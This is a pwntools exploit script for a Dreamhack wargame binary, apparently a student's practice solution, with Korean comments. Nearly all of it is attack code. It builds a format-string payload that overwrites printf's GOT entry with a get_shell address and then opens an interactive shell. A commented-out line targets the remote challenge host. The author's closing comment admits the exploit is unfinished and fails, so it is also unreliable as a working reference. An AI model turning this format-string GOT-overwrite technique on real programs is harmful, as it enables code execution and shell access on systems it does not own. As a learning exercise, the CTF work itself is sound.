# -*-coding:utf-8 -*-
from pwn import *


p = process('./basic_exploitation_003')
gdb.attach(p,gdb_args=['-q','-ex init-pwngdb'])
#p = remote('host1.dreamhack.games', 15097)

context.clear()
context.update(arch='i386', os='linux')
context.log_level='debug'

e = ELF('./basic_exploitation_003')
getshell = hex(e.symbols['get_shell'])
printf_got = e.got['printf']

print 'getshell : ', getshell

'''
alarm = e.got['alarm']

payload = p32(alarm)
payload += "%x"
'''

payload = ''
#payload = p32(printf_got+0x3)
payload += p32(printf_got)
payload += p32(printf_got+0x1)

# 0x@@000000 overwrite 1 byte
# 첫 1바이트는 payload에 주소값이 3개가 들어갈 경우 0x08값을 넘어버려서 %n으로 write할 수 없어 그대로 두었다. 주소를 다른 방식으로 잘라낸다면 충분히 덮어 쓸 수 있다.
'''
up_addr = getshell[2:3]
print up_addr
print len(payload)
if int(up_addr,16) > len(payload):
	up_overwrite = int(up_addr,16) - len(payload)
else:
	up_overwrite = up_addr
payload += "%" + str(up_overwrite) + "c%1$hn"
'''

# 0x000000@@ overwrite 1 byte

down_addr = getshell[7:9]
down_overwrite = int(down_addr, 16) - len(payload)
payload += "%" +str(down_overwrite) +"c%1$hn"

# 0x00@@@@00 overwrite 2 byte

middle_addr = getshell[4:7]
middle_overwrite = int(middle_addr, 16) - down_overwrite - 0x8
payload += "%" + str(middle_overwrite) + "c%2$hn"
print payload

p.send(payload)

p.interactive()

''' 
printf@got가 getshell로 덮이지만 getshell이 함수 안에서 system("/bin/sh")를 호출할 때 "/bin/sh"가 0x2020으로 덮어져버려서 getshell을 사용할 수 없다.
libc에 존재하는 one_shot gadget을 사용해볼까 해서 alarm()함수의 got을 구하여 libc leak 을 해볼까 했지만 %x로는 got가 가지고 있는 libc의 값을 가지겨올 수 없다.

일단은 훗날 복기용으로 미완성exploit을 남겨놓으려고한다.
'''

